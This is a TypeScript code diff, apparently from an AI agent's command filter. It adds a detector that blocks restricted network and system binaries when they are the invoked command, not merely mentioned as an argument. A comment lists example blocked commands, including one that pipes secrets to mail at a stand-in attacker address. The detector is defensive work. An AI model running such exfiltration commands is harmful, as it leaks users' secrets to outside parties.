@@ -9,6 +9,7 @@ import { homedir } from "node:os";
 import {
   INTERP_ESCAPE_BINS,
   NETWORK_CLIENT_BINS,
+  DANGEROUS_INVOKE_BINS,
   INTERP_EVAL_FLAGS,
   RENAME_ESCAPE_EVAL_FLAGS,
 } from "./shell-rules.js";
@@ -206,6 +207,26 @@ export function detectNetworkClientArgv0(command: string): string | null {
     if (tokens.length === 0) continue;
     if (NETWORK_CLIENT_BINS.has(execBasename(tokens[0]))) {
       return "Blocked: raw shell network client — use http_request (SSRF-checked) instead.";
+    }
+  }
+  return null;
+}
+
+// ── argv[0] dangerous-command basenames (FP-safe sibling of detectNetworkClientArgv0) ──
+// Block these binaries when they are the INVOKED command (argv[0]) of any pipe
+// segment, never as a substring — so a dangerous binary NAME appearing as an
+// argument (`grep host`, `… | grep open`, `echo "ping it"`) is ALLOWED, while
+// invoking it (`host evil`, `mount /dev/x /mnt`, `cat secrets | mail a@evil`) is
+// blocked. This replaces the old `\bhost\s`/`\bopen\s`/… BLOCKED_COMMANDS
+// substrings that false-positived on benign arguments. Same tokenize→basename
+// approach as detectNetworkClientArgv0.
+export function detectDangerousInvokeBin(command: string): string | null {
+  for (const segment of command.split("|")) {
+    const tokens = tokenizeCommand(segment);
+    if (tokens.length === 0) continue;
+    const bin = execBasename(tokens[0]);
+    if (DANGEROUS_INVOKE_BINS.has(bin)) {
+      return `Blocked: '${bin}' is a restricted network/system command. (If you only named it as an argument, rephrase — the block is on INVOKING it, not mentioning it.)`;
     }
   }
   return null;
